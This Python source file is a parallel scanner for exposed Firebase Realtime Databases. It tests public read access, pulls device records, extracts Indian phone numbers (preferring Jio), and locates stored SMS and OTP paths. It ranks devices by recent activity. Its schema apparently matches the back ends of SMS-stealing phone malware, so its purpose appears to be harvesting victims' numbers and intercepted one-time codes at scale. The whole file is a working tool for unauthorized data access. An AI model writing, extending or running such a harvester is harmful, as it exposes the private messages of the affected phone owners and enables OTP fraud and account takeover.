import re
import time
import requests
from typing import List, Dict, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
}

NON_JIO_KEYWORDS = ['airtel', 'air', 'vi', 'vodafone', 'idea', 'bsnl', 'aircel', 'telenor', 'docomo', 'mtnl']
JIO_KEYWORDS = ['jio', 'reliance', '620016', '620040', 'jiopay', 'jioinf', 'jiohtr', 'jiofbr']

def clean_firebase_url(raw_url: str) -> str:
    """Cleans and standardizes a Firebase Realtime Database URL."""
    if not raw_url:
        return ""
    u = raw_url.strip()
    match = re.search(r'https?://[^\s\'"<>]+', u)
    if match:
        u = match.group(0)
    elif "firebaseio.com" in u or "firebasedatabase.app" in u:
        m2 = re.search(r'[a-zA-Z0-9_\-\.]+\.(?:firebaseio\.com|firebasedatabase\.app)', u)
        if m2:
            u = f"https://{m2.group(0)}"
    
    u = u.split('?')[0].rstrip('/')
    if u.endswith('.json'):
        u = u[:-5]
    if u.endswith('/clients'):
        u = u[:-8]
    if u.endswith('/users'):
        u = u[:-6]
    return u.rstrip('/')

def extract_firebase_urls(text: str) -> List[str]:
    """
    Extracts, cleans, and deduplicates all Firebase Realtime Database URLs
    from any unstructured text, numbered lists, bullet points, or message strings.
    """
    if not text:
        return []

    # Pattern matches standard http/https Firebase RTDB endpoints
    pattern_http = r'(https?://[a-zA-Z0-9_-]+(?:\.europe-west1|\.asia-southeast1|\.us-central1)?\.(?:firebaseio\.com|firebasedatabase\.app)[^\s,;)"\']*)'
    raw_matches = re.findall(pattern_http, text, re.IGNORECASE)

    # Also match bare domains without http/https (e.g. "my-app.firebaseio.com")
    pattern_bare = r'(?:^|[\s,;(\[<])([a-zA-Z0-9_-]+(?:\.europe-west1|\.asia-southeast1|\.us-central1)?\.(?:firebaseio\.com|firebasedatabase\.app)[^\s,;)"\']*)'
    for m in re.findall(pattern_bare, text, re.IGNORECASE):
        candidate = f"https://{m}"
        if candidate not in raw_matches:
            raw_matches.append(candidate)

    cleaned_urls = []
    seen = set()
    for raw in raw_matches:
        cleaned = clean_firebase_url(raw)
        if cleaned.startswith("http") and ("firebaseio.com" in cleaned or "firebasedatabase.app" in cleaned):
            if cleaned not in seen:
                seen.add(cleaned)
                cleaned_urls.append(cleaned)

    return cleaned_urls

def is_jio_carrier(name: Optional[str]) -> bool:
    if not name:
        return False
    c = name.lower()
    return any(k in c for k in JIO_KEYWORDS)

def is_other_carrier(name: Optional[str]) -> bool:
    if not name:
        return False
    c = name.lower()
    # Ensure word boundary or strong match so 'airtel' matches, but not accidental substrings
    return any(k in c for k in ['airtel', 'vodafone', 'idea', 'bsnl'])

def clean_indian_phone(val) -> Optional[str]:
    """Extracts and validates a 10-digit Indian mobile number."""
    if not val:
        return None
    p_str = re.sub(r'[^0-9]', '', str(val))
    if len(p_str) == 10 and p_str[0] in '6789':
        return p_str
    if len(p_str) > 10:
        last10 = p_str[-10:]
        if last10[0] in '6789':
            return last10
    return None

class FirebaseEngine:
    def __init__(self, base_url: str, timeout: int = 7):
        self.base_url = clean_firebase_url(base_url)
        self.timeout = timeout
        self.session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(pool_connections=60, pool_maxsize=60)
        self.session.mount('https://', adapter)
        self.session.mount('http://', adapter)
        self.session.headers.update(HEADERS)

    def test_connection(self) -> Tuple[bool, str]:
        """Tests if the Firebase database is reachable and open."""
        if not self.base_url.startswith("http"):
            return False, "Invalid URL format. Must start with https://"
        
        try:
            r = self.session.get(f"{self.base_url}/.json?shallow=true", timeout=self.timeout)
            if r.status_code == 200:
                data = r.json()
                if data is None:
                    return False, "Database is empty."
                if isinstance(data, dict):
                    return True, f"Connected. Found {len(data)} root keys."
                return True, "Connected."
            elif r.status_code in [401, 403]:
                return False, "Permission Denied! Database has security rules blocking public access."
            elif r.status_code == 404:
                return False, "Database not found (404). Check the URL."
            else:
                return False, f"Server returned HTTP {r.status_code}."
        except requests.exceptions.Timeout:
            return False, "Connection timed out. Database might be down or slow."
        except Exception as e:
            return False, f"Error: {str(e)}"

    def _extract_device_info(self, dev_id: str, dev_data: dict, subpath_prefix: str, root_keys: set) -> Optional[Dict]:
        """In-memory extractor for device details, phone, carrier, activity, and candidate SMS paths."""
        if not isinstance(dev_data, dict):
            return None

        phone = None
        carrier = None
        is_jio = False
        heartbeat_ts = 0
        status_online = False

        # 1. Heartbeat & Activity
        ping = dev_data.get('ping')
        if isinstance(ping, dict):
            ts = ping.get('ts') or ping.get('timestamp')
            if isinstance(ts, (int, float)):
                heartbeat_ts = int(ts)
            if ping.get('wake') is True:
                status_online = True
        
        for h_key in ['heartbeat', 'lastSeen', 'last_seen', 'timestamp', 'lastActive', 'lastMessageTime', 'time']:
            val = dev_data.get(h_key)
            if isinstance(val, (int, float)) and val > heartbeat_ts:
                heartbeat_ts = int(val)

        if dev_data.get('status') in [True, 1, '1', 'true', 'online', 'Online', 'ACTIVE', 'active']:
            status_online = True

        # 2. Extract Phone & Carrier
        mob_no = dev_data.get('mobNo')
        if mob_no:
            if is_jio_carrier(mob_no):
                is_jio = True
                carrier = 'Jio'
            elif is_other_carrier(mob_no):
                carrier = str(mob_no)
            p = clean_indian_phone(mob_no)
            if p:
                phone = p

        sim_info = dev_data.get('simInfo')
        if isinstance(sim_info, dict):
            for slot in ['sim1', 'sim2', 'sim0', 'simSlot1', 'simSlot2']:
                s_obj = sim_info.get(slot)
                if isinstance(s_obj, dict):
                    c_name = s_obj.get('carrierName') or s_obj.get('carrier') or s_obj.get('displayName')
                    raw_p = s_obj.get('number') or s_obj.get('phoneNumber') or s_obj.get('phone')
                    p = clean_indian_phone(raw_p)
                    if is_jio_carrier(c_name):
                        is_jio = True
                        carrier = c_name
                        if p:
                            phone = p
                            break
                    elif is_other_carrier(c_name):
                        carrier = c_name
                    elif p and not phone:
                        phone = p
                        carrier = c_name

        if not phone:
            for pk in ['phoneNumber', 'phone_number', 'mobile', 'number', 'phone', 'userPhone']:
                p = clean_indian_phone(dev_data.get(pk))
                if p:
                    phone = p
                    break

        if not phone:
            fd = dev_data.get('form_data')
            if isinstance(fd, dict):
                p = clean_indian_phone(fd.get('mobile') or fd.get('phone') or fd.get('phoneNumber'))
                if p:
                    phone = p

        if not phone:
            for act_k in ['action', 'command', 'sendSms', 'send_sms', 'sms']:
                act = dev_data.get(act_k)
                if isinstance(act, dict):
                    p = clean_indian_phone(act.get('phoneNumber') or act.get('phone') or act.get('number') or act.get('mobNo'))
                    if p:
                        phone = p
                        break

        if not phone:
            return None

        # Discard explicitly verified non-Jio carrier (e.g. Airtel, Vi, BSNL)
        if carrier and is_other_carrier(carrier) and not is_jio:
            return None

        if not carrier:
            carrier = 'Jio Candidate'
            is_jio = True

        sms_paths = []
        dev_path = f"{subpath_prefix}/{dev_id}".rstrip('/')
        if not dev_path.startswith('/'):
            dev_path = '/' + dev_path

        sms_count = 0
        for sk in ['receivedSms', 'all_sms', 'messages', 'smsList', 'sms']:
            if sk in dev_data and isinstance(dev_data[sk], dict) and len(dev_data[sk]) > 0:
                sms_paths.append(f"{dev_path}/{sk}")
                sms_count = max(sms_count, len(dev_data[sk]))

        for r_sms in ['messages', 'profex_incoming', 'incoming_sms', 'all_sms', 'user_sms']:
            if r_sms in root_keys:
                sms_paths.append(f"/{r_sms}/{dev_id}")

        if 'otps' in root_keys:
            sms_paths.append(f"/otps/{phone}")
        if 'otpRequests' in root_keys:
            sms_paths.append(f"/otpRequests/{phone}")
        if 'numbers' in root_keys:
            sms_paths.append(f"/numbers/{phone}/messages")

        fallback = f"{dev_path}/receivedSms"
        if fallback not in sms_paths:
            sms_paths.append(fallback)

        activity_score = 0
        now_ms = int(time.time() * 1000)
        if heartbeat_ts > 0:
            if heartbeat_ts < 10000000000:
                heartbeat_ts *= 1000
            days_ago = max(0.0, (now_ms - heartbeat_ts) / (1000 * 60 * 60 * 24))
            if days_ago <= 2.0:
                activity_score += 600
            elif days_ago <= 7.0:
                activity_score += 300
        elif status_online:
            activity_score += 500

        if is_jio:
            activity_score += 200
        if sms_count > 0:
            activity_score += min(100, sms_count)

        return {
            'device_id': dev_id,
            'subpath': dev_path,
            'base_url': self.base_url,
            'phone': phone,
            'carrier': carrier,
            'sms_path': sms_paths[0],
            'sms_paths': sms_paths,
            'sms_count': sms_count,
            'heartbeat_ts': heartbeat_ts,
            'status_online': status_online,
            'activity_score': activity_score,
            'is_jio': is_jio
        }

    def discover_devices(self, max_devices: int = 150) -> List[Dict]:
        """
        Ultra-fast Turbo Device Discovery:
        1. Fast-Path Container Fetching: Fetches entire device containers (clients, users, All_Users, etc.)
           in a single HTTP GET (<400ms) and parses all devices in memory in milliseconds.
        2. Admin Container Fetching: Direct fetch of /admin.json when present.
        3. Direct Root Hex Fetching: Parallel fetch of /{dev_id}.json for root-level hex devices.
        4. Prioritizes active, live devices with verified Jio carriers and incoming SMS capabilities.
        """
        devices = []
        try:
            r = self.session.get(f"{self.base_url}/.json?shallow=true", timeout=self.timeout)
            if r.status_code != 200 or not isinstance(r.json(), dict):
                return devices
            root_keys = set(r.json().keys())
        except Exception:
            return devices

        # 1. Fast-Path Container Fetching (Single GET per container)
        containers = ['clients', 'users', 'All_Users', 'All_User', 'devices', 'registeredDevices', 'user_data']
        for c_node in [c for c in containers if c in root_keys]:
            try:
                c_r = self.session.get(f"{self.base_url}/{c_node}.json", timeout=3.5)
                if c_r.status_code == 200 and isinstance(c_r.json(), dict):
                    c_data = c_r.json()
                    for dev_id, dev_obj in c_data.items():
                        if isinstance(dev_obj, dict):
                            d_info = self._extract_device_info(dev_id, dev_obj, f"/{c_node}", root_keys)
                            if d_info:
                                devices.append(d_info)
            except Exception:
                pass

        # 2. Admin container: /admin.json
        if 'admin' in root_keys and len(devices) < 5:
            try:
                adm_r = self.session.get(f"{self.base_url}/admin.json", timeout=3.5)
                if adm_r.status_code == 200 and isinstance(adm_r.json(), dict):
                    adm_data = adm_r.json()
                    for adm_id, adm_val in adm_data.items():
                        if isinstance(adm_val, dict) and 'users' in adm_val and isinstance(adm_val['users'], dict):
                            for dev_id, dev_obj in adm_val['users'].items():
                                if isinstance(dev_obj, dict):
                                    d_info = self._extract_device_info(dev_id, dev_obj, f"/admin/{adm_id}/users", root_keys)
                                    if d_info:
                                        devices.append(d_info)
            except Exception:
                pass

        # 3. Direct Root Hex Fetching: /{dev_id}.json
        if not devices:
            hex_devices = [k for k in root_keys if len(k) >= 12 and all(c in '0123456789abcdefABCDEF-_' for c in k)]
            if hex_devices:
                def fetch_hex_dev(d_id):
                    try:
                        dev_r = self.session.get(f"{self.base_url}/{d_id}.json", timeout=2.5)
                        if dev_r.status_code == 200 and isinstance(dev_r.json(), dict):
                            return self._extract_device_info(d_id, dev_r.json(), "", root_keys)
                    except Exception:
                        pass
                    return None

                with ThreadPoolExecutor(max_workers=20) as hex_pool:
                    hex_futs = [hex_pool.submit(fetch_hex_dev, hid) for hid in hex_devices[:max_devices]]
                    for hf in hex_futs:
                        res = hf.result()
                        if res:
                            devices.append(res)

        # 4. /numbers/{phone} schema
        if 'numbers' in root_keys and not devices:
            try:
                num_r = self.session.get(f"{self.base_url}/numbers.json?shallow=true", timeout=2.5)
                if num_r.status_code == 200 and isinstance(num_r.json(), dict):
                    for raw_p in list(num_r.json().keys())[:max_devices]:
                        c_p = clean_indian_phone(raw_p)
                        if c_p:
                            p_sms = f"/numbers/{raw_p}/messages"
                            devices.append({
                                'device_id': raw_p,
                                'subpath': f"/numbers/{raw_p}",
                                'base_url': self.base_url,
                                'phone': c_p,
                                'carrier': 'Jio (Direct)',
                                'sms_path': p_sms,
                                'sms_paths': [p_sms],
                                'sms_count': 1,
                                'heartbeat_ts': 0,
                                'status_online': False,
                                'activity_score': 400,
                                'is_jio': True
                            })
            except Exception:
                pass

        # Deduplicate phones preserving highest activity score
        unique_devices = {}
        for d in devices:
            p = d['phone']
            if p not in unique_devices or d.get('activity_score', 0) > unique_devices[p].get('activity_score', 0):
                unique_devices[p] = d

        result_list = list(unique_devices.values())
        result_list.sort(key=lambda x: x.get('activity_score', 0), reverse=True)
        return result_list


def scan_multiple_firebase_urls(urls: List[str], max_workers: int = 50) -> Tuple[List[Dict], Dict]:
    """
    High-speed parallel scanner across any number of Firebase URLs.
    Scans 100+ URLs in seconds concurrently.
    Returns:
       (all_unique_devices_sorted, summary_stats)
    """
    t_start = time.time()
    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(pool_connections=max_workers * 2, pool_maxsize=max_workers * 2)
    session.mount('https://', adapter)
    session.headers.update(HEADERS)

    def scan_url(u: str):
        eng = FirebaseEngine(u)
        eng.session = session
        devs = eng.discover_devices()
        return u, devs

    all_devices_map = {}
    dbs_summary = {}

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futs = {executor.submit(scan_url, u): u for u in urls}
        for fut in as_completed(futs):
            u, devs = fut.result()
            dbs_summary[u] = {
                'devices_count': len(devs),
                'live_count': sum(1 for d in devs if d.get('activity_score', 0) >= 500),
                'status': 'open' if devs else 'empty_or_offline'
            }
            for d in devs:
                p = d['phone']
                if p not in all_devices_map or d.get('activity_score', 0) > all_devices_map[p].get('activity_score', 0):
                    all_devices_map[p] = d

    sorted_all = sorted(all_devices_map.values(), key=lambda x: x.get('activity_score', 0), reverse=True)
    summary = {
        'total_urls': len(urls),
        'active_dbs': sum(1 for v in dbs_summary.values() if v['devices_count'] > 0),
        'total_unique_phones': len(sorted_all),
        'live_phones': sum(1 for d in sorted_all if d.get('activity_score', 0) >= 500),
        'duration': round(time.time() - t_start, 2),
        'dbs': dbs_summary
    }
    return sorted_all, summary
